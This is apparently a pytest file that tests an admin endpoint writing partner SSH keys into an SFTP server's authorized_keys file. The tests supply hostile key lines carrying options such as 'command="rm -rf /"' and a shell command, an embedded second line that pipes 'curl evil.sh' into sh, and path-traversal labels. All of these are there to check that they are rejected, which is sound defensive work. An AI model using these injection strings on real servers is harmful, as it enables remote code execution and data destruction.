"""`/admin/sftp/keys` — registering a partner's SSH key from the console.

This endpoint writes into **authorized_keys**, which is remote-code-access
control for the SFTP container, using material that arrives from a third party
over email. The tests below are mostly about what must NOT get in:

* **Options injection.** OpenSSH accepts an options field before the key type:
  ``command="rm -rf /" ssh-ed25519 AAAA…`` runs that command on every login. A
  key line is therefore only accepted if it *begins* with a known key type.
  ``test_options_prefix_is_rejected`` is the one to keep working.
* **A second line.** An embedded newline smuggles a whole unvalidated entry in
  behind a valid one.
* **A lying prefix.** The base64 blob names its own type; if it disagrees with
  the line's prefix, we reject rather than pick a side.

And two things that must happen: a key lands in **both** ``authorized_keys``
(sshd re-reads it per connection — no restart) and ``keys/<label>.pub`` (atmoz/
sftp rebuilds authorized_keys from that dir at boot, so a key missing here dies
at the next restart), and a delete removes it from both.

The keys below are REAL, generated with ``ssh-keygen -t ed25519``; the
fingerprints are what ``ssh-keygen -lf`` prints for them, so the format the page
shows an operator is checked against the tool the partner reads theirs from.
"""

from __future__ import annotations

import pytest
from fastapi import Request

from app import admin as adminmod
from app.config import get_settings

from tests.test_sftp_page import _Admin

KEY_A = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEdkualxQa8WOdOeRXD8MZ/OIeItquhI82sNdAPyiqJB partner@corp"
FP_A = "SHA256:8DGoKqnkF9f7ZZ86P/znbow+a0/GncMql1wbzIPkN6I"

KEY_B = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIARSveuQOfZRznXX9B15uVyIndzwJzM0IoX+o93n8ntX partner-b@corp"
FP_B = "SHA256:jfaS6stOIsSzXi2T1XD0KghPeLBJhkPhw1cbbQkwgs4"


@pytest.fixture
def super_admin():
    a = _Admin(role="super_admin")
    yield a
    a.drop()


@pytest.fixture
def plain_admin():
    a = _Admin(role="admin")
    yield a
    a.drop()


@pytest.fixture
def keys_dir(tmp_path, monkeypatch):
    """Point SFTP_KEYS_DIR at a temp dir standing in for the `sftp_ssh` volume."""

    d = tmp_path / "sftp_ssh"
    d.mkdir()
    monkeypatch.setenv("SFTP_KEYS_DIR", str(d))
    get_settings.cache_clear()
    yield d
    # Undo the env var BEFORE dropping the cache, or the next test rebuilds
    # settings that still point at a tmp_path pytest is about to delete.
    monkeypatch.undo()
    get_settings.cache_clear()


def _authorized_keys(d) -> str:
    p = d / "authorized_keys"
    return p.read_text() if p.exists() else ""


# ---- the validator: what must never reach authorized_keys -------------------


def test_options_prefix_is_rejected(api_client, super_admin, keys_dir):
    """`command="…" ssh-ed25519 AAAA…` is remote code execution. Refuse it.

    sshd runs the `command=` value INSTEAD of the sftp subsystem on every login
    with that key. A partner-supplied line carrying options turns a file drop
    into a shell. The 400 is not the real assertion — the real assertion is that
    the string never appears on disk in either file.
    """

    hostile = f'command="rm -rf /" {KEY_A}'
    r = api_client.post(
        "/admin/sftp/keys",
        json={"label": "evil", "public_key": hostile},
        headers=super_admin.headers,
    )
    assert r.status_code == 400

    assert "command=" not in _authorized_keys(keys_dir)
    assert not (keys_dir / "keys").exists() or not list((keys_dir / "keys").glob("*.pub"))


@pytest.mark.parametrize(
    "opt",
    [
        'command="/bin/sh"',
        'environment="LD_PRELOAD=/tmp/x.so"',
        'permitopen="10.0.0.1:5432"',
        "no-pty,command=\"id\"",
    ],
)
def test_every_options_flavour_is_rejected(api_client, super_admin, keys_dir, opt):
    """Not just `command=` — anything before the key type is refused."""

    r = api_client.post(
        "/admin/sftp/keys",
        json={"label": "evil", "public_key": f"{opt} {KEY_A}"},
        headers=super_admin.headers,
    )
    assert r.status_code == 400
    assert _authorized_keys(keys_dir) == ""


def test_tab_smuggled_options_are_rejected(api_client, super_admin, keys_dir):
    """A TAB is whitespace too: `type\\t<blob>\\tcommand="…"` splits into three
    clean fields, so the options slip in disguised as a trailing comment. A real
    .pub line uses spaces, so the tab itself is the tell — refuse it."""

    ktype, b64 = KEY_A.split()[0], KEY_A.split()[1]
    hostile = f'{ktype}\t{b64}\tcommand="id"'
    r = api_client.post(
        "/admin/sftp/keys",
        json={"label": "tabbed", "public_key": hostile},
        headers=super_admin.headers,
    )
    assert r.status_code == 400
    assert "command=" not in _authorized_keys(keys_dir)


def test_second_line_is_rejected(api_client, super_admin, keys_dir):
    """An embedded newline is the same attack, hidden behind a valid first line."""

    smuggled = KEY_A + '\ncommand="curl evil.sh|sh" ' + KEY_B
    r = api_client.post(
        "/admin/sftp/keys",
        json={"label": "two-lines", "public_key": smuggled},
        headers=super_admin.headers,
    )
    assert r.status_code == 400
    assert _authorized_keys(keys_dir) == ""


def test_trailing_newline_is_fine(api_client, super_admin, keys_dir):
    """A .pub file ends in a newline, and that is what an operator pastes.

    The line-break rejection must be about INTERIOR newlines only, or the
    ordinary copy-paste path 400s and the operator concludes the key is bad.
    """

    r = api_client.post(
        "/admin/sftp/keys",
        json={"label": "trailing", "public_key": KEY_A + "\n"},
        headers=super_admin.headers,
    )
    assert r.status_code == 200


def test_garbage_base64_is_rejected(api_client, super_admin, keys_dir):
    r = api_client.post(
        "/admin/sftp/keys",
        json={"label": "junk", "public_key": "ssh-ed25519 not-base64!!!! nobody@nowhere"},
        headers=super_admin.headers,
    )
    assert r.status_code == 400
    assert _authorized_keys(keys_dir) == ""


def test_type_prefix_must_match_the_key_blob(api_client, super_admin, keys_dir):
    """The blob names its own type. A line that lies about it is refused.

    Decoding the base64 is not enough on its own — it proves the bytes are
    well-formed, not that they are the kind of key the line claims.
    """

    lying = KEY_A.replace("ssh-ed25519", "ssh-rsa", 1)
    r = api_client.post(
        "/admin/sftp/keys",
        json={"label": "liar", "public_key": lying},
        headers=super_admin.headers,
    )
    assert r.status_code == 400
    assert "mismatch" in r.json()["detail"]


def test_oversized_key_is_rejected(api_client, super_admin, keys_dir):
    r = api_client.post(
        "/admin/sftp/keys",
        json={"label": "huge", "public_key": "ssh-ed25519 " + "A" * 9000},
        headers=super_admin.headers,
    )
    assert r.status_code == 400


def test_label_cannot_escape_the_keys_dir(api_client, super_admin, keys_dir):
    """The label becomes `keys/<label>.pub`, so a path in it would be a write-anywhere."""

    for label in ["../../etc/authorized_keys", "a/b", ".hidden"]:
        r = api_client.post(
            "/admin/sftp/keys",
            json={"label": label, "public_key": KEY_A},
            headers=super_admin.headers,
        )
        assert r.status_code == 400, label


# ---- the happy path: both files, or the key dies at the next restart --------


def test_valid_key_lands_in_authorized_keys_and_keys_dir(api_client, super_admin, keys_dir):
    """Both writes. Either one alone is a silent regression.

    authorized_keys only  -> works now, gone after `docker compose restart sftp`
                             (atmoz rebuilds it from keys/).
    keys/ only            -> does not work until a restart, which is exactly the
                             manual dance this feature exists to remove.
    """

    r = api_client.post(
        "/admin/sftp/keys",
        json={"label": "acme", "public_key": KEY_A},
        headers=super_admin.headers,
    )
    assert r.status_code == 200
    assert r.json()["fingerprint"] == FP_A

    ak = _authorized_keys(keys_dir)
    pub = (keys_dir / "keys" / "acme.pub").read_text()

    blob = KEY_A.split()[1]
    assert blob in ak
    assert blob in pub
    # We write OUR label as the comment, never the partner's — nothing outside
    # the type-checked base64 blob is attacker-controlled.
    assert ak.strip().endswith("pharma:acme")
    assert ak.startswith("ssh-ed25519 ")


def test_authorized_keys_is_0600(api_client, super_admin, keys_dir):
    """sshd ignores a group/world-writable authorized_keys — silently."""

    api_client.post(
        "/admin/sftp/keys",
        json={"label": "acme", "public_key": KEY_A},
        headers=super_admin.headers,
    )
    assert oct((keys_dir / "authorized_keys").stat().st_mode)[-3:] == "600"


def test_list_returns_fingerprints_not_key_material(api_client, super_admin, keys_dir):
    """An operator verifies a fingerprint against the partner. The blob is not needed."""

    api_client.post(
        "/admin/sftp/keys", json={"label": "acme", "public_key": KEY_A}, headers=super_admin.headers
    )
    api_client.post(
        "/admin/sftp/keys", json={"label": "beta", "public_key": KEY_B}, headers=super_admin.headers
    )

    r = api_client.get("/admin/sftp/keys", headers=super_admin.headers)
    assert r.status_code == 200
    rows = r.json()

    assert {x["label"] for x in rows} == {"acme", "beta"}
    assert {x["fingerprint"] for x in rows} == {FP_A, FP_B}
    assert all(x["type"] == "ssh-ed25519" and x["added_at"] > 0 for x in rows)
    # The raw key never rides back out.
    assert KEY_A.split()[1] not in r.text


def test_delete_removes_from_both_files(api_client, super_admin, keys_dir):
    """Half a delete is not a delete.

    Leave the .pub behind and the boot rebuild resurrects a revoked key; leave
    the authorized_keys line behind and the partner keeps connecting until the
    next restart. Either way the console said "removed" and lied.
    """

    api_client.post(
        "/admin/sftp/keys", json={"label": "acme", "public_key": KEY_A}, headers=super_admin.headers
    )
    api_client.post(
        "/admin/sftp/keys", json={"label": "beta", "public_key": KEY_B}, headers=super_admin.headers
    )

    r = api_client.delete("/admin/sftp/keys/acme", headers=super_admin.headers)
    assert r.status_code == 200

    ak = _authorized_keys(keys_dir)
    assert KEY_A.split()[1] not in ak
    assert not (keys_dir / "keys" / "acme.pub").exists()

    # The other partner is untouched — a revocation must not be an outage.
    assert KEY_B.split()[1] in ak
    assert (keys_dir / "keys" / "beta.pub").exists()

    labels = {x["label"] for x in api_client.get("/admin/sftp/keys", headers=super_admin.headers).json()}
    assert labels == {"beta"}


def test_delete_unknown_label_is_404(api_client, super_admin, keys_dir):
    r = api_client.delete("/admin/sftp/keys/nope", headers=super_admin.headers)
    assert r.status_code == 404


def test_duplicate_fingerprint_is_refused(api_client, super_admin, keys_dir):
    """Two labels for one key means revoking one leaves access open under the other."""

    api_client.post(
        "/admin/sftp/keys", json={"label": "acme", "public_key": KEY_A}, headers=super_admin.headers
    )
    r = api_client.post(
        "/admin/sftp/keys", json={"label": "acme-again", "public_key": KEY_A}, headers=super_admin.headers
    )
    assert r.status_code == 409
    assert "acme" in r.json()["detail"]


def test_duplicate_label_is_refused(api_client, super_admin, keys_dir):
    """...and must not silently overwrite the key registered under that label."""

    api_client.post(
        "/admin/sftp/keys", json={"label": "acme", "public_key": KEY_A}, headers=super_admin.headers
    )
    r = api_client.post(
        "/admin/sftp/keys", json={"label": "acme", "public_key": KEY_B}, headers=super_admin.headers
    )
    assert r.status_code == 409
    assert KEY_A.split()[1] in _authorized_keys(keys_dir)
    assert KEY_B.split()[1] not in _authorized_keys(keys_dir)


def test_hand_placed_authorized_keys_lines_survive(api_client, super_admin, keys_dir):
    """We append; we do not rewrite from keys/. An operator's own line stays."""

    (keys_dir / "authorized_keys").write_text(KEY_B + "\n")
    api_client.post(
        "/admin/sftp/keys", json={"label": "acme", "public_key": KEY_A}, headers=super_admin.headers
    )

    ak = _authorized_keys(keys_dir)
    assert KEY_B.split()[1] in ak
    assert KEY_A.split()[1] in ak


# ---- the volume is not mounted ----------------------------------------------


def test_missing_keys_dir_is_an_actionable_503(api_client, super_admin, tmp_path, monkeypatch):
    """A dev stack without the volume must say so, not throw a FileNotFoundError."""

    monkeypatch.setenv("SFTP_KEYS_DIR", str(tmp_path / "not-mounted"))
    get_settings.cache_clear()
    try:
        r = api_client.get("/admin/sftp/keys", headers=super_admin.headers)
        assert r.status_code == 503
        detail = r.json()["detail"]
        assert "not mounted" in detail and "SFTP_KEYS_DIR" in detail

        r = api_client.post(
            "/admin/sftp/keys",
            json={"label": "acme", "public_key": KEY_A},
            headers=super_admin.headers,
        )
        assert r.status_code == 503
    finally:
        monkeypatch.undo()
        get_settings.cache_clear()


# ---- auth: super_admin only, on every verb ----------------------------------


def test_keys_are_super_admin_only(api_client, plain_admin, keys_dir):
    """A branch admin passes require_admin. Key registration is a higher bar:
    it grants shell-adjacent access to the ingest server."""

    assert api_client.get("/admin/sftp/keys", headers=plain_admin.headers).status_code == 403
    assert (
        api_client.post(
            "/admin/sftp/keys",
            json={"label": "acme", "public_key": KEY_A},
            headers=plain_admin.headers,
        ).status_code
        == 403
    )
    assert api_client.delete("/admin/sftp/keys/acme", headers=plain_admin.headers).status_code == 403

    # Rejected, and nothing written.
    assert _authorized_keys(keys_dir) == ""


def test_keys_need_a_token(api_client, keys_dir):
    assert api_client.get("/admin/sftp/keys").status_code == 401
    assert api_client.post("/admin/sftp/keys", json={"label": "a", "public_key": KEY_A}).status_code == 401
    assert api_client.delete("/admin/sftp/keys/a").status_code == 401


# ---- host_source: env > detected > none -------------------------------------


def test_host_source_is_env_when_the_var_is_set(api_client, super_admin, monkeypatch):
    """A configured host is authoritative and beats anything in the headers."""

    monkeypatch.setenv("SFTP_PUBLIC_HOST", "sftp.pharma.example")
    get_settings.cache_clear()
    try:
        body = api_client.get(
            "/admin/sftp/connection",
            headers={**super_admin.headers, "X-Forwarded-Host": "wrong.example"},
        ).json()
        assert body["host"] == "sftp.pharma.example"
        assert body["host_source"] == "env"
        assert body["host_configured"] is True
    finally:
        monkeypatch.undo()
        get_settings.cache_clear()


def test_host_source_is_detected_from_the_forwarded_host(api_client, super_admin, monkeypatch):
    """No env var: fall back to the name this request arrived on — hostname only.

    host_configured stays False: a detected host is a suggestion the operator
    confirms. Behind a proxy it can be a name the sftp port is not published on.
    """

    monkeypatch.setenv("SFTP_PUBLIC_HOST", "")
    get_settings.cache_clear()
    try:
        body = api_client.get(
            "/admin/sftp/connection",
            headers={**super_admin.headers, "X-Forwarded-Host": "pharma.example.com:8443"},
        ).json()
        assert body["host"] == "pharma.example.com"   # no port
        assert body["host_source"] == "detected"
        assert body["host_configured"] is False

        # No X-Forwarded-Host -> plain Host header.
        body = api_client.get("/admin/sftp/connection", headers=super_admin.headers).json()
        assert body["host"] == "testserver"
        assert body["host_source"] == "detected"
    finally:
        monkeypatch.undo()
        get_settings.cache_clear()


@pytest.mark.parametrize(
    "raw,want",
    [
        ("pharma.example.com", "pharma.example.com"),
        ("pharma.example.com:8443", "pharma.example.com"),
        ("https://pharma.example.com:8443/admin", "pharma.example.com"),
        ("a.example.com, b.example.com", "a.example.com"),   # proxy chain: first hop
        ("[2001:db8::1]:8443", "2001:db8::1"),
        ("", ""),
    ],
)
def test_detect_host_strips_scheme_and_port(raw, want):
    req = Request(
        {
            "type": "http",
            "headers": [(b"x-forwarded-host", raw.encode())] if raw else [],
        }
    )
    assert adminmod._detect_host(req) == want


@pytest.mark.asyncio
async def test_host_source_is_none_without_any_host_header(monkeypatch):
    """Neither env nor a Host header -> "none", and the page asks for it.

    Driven against the endpoint function directly: every HTTP client sends a
    Host header, so this state is unreachable through TestClient.
    """

    monkeypatch.setenv("SFTP_PUBLIC_HOST", "")
    get_settings.cache_clear()
    try:
        body = await adminmod.sftp_connection(Request({"type": "http", "headers": []}))
        assert body["host"] == ""
        assert body["host_source"] == "none"
        assert body["host_configured"] is False
    finally:
        monkeypatch.undo()
        get_settings.cache_clear()
